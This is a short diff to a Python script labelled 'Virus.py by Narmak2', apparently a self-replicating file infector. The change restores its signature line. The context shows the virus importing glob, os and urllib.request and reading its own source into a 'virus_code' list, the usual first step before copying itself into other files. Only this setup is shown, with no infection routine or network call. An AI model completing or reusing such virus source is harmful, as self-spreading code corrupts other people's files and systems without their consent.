@@ -3,7 +3,7 @@ import sys
 import glob
 import os
 import urllib.request
-#sig = 'Virus.py by Narmak2'
+sig = 'Virus.py by Narmak2'
 ff = sys.argv[0]
 virus_code = []
 with open(sys.argv[0], 'r') as f:
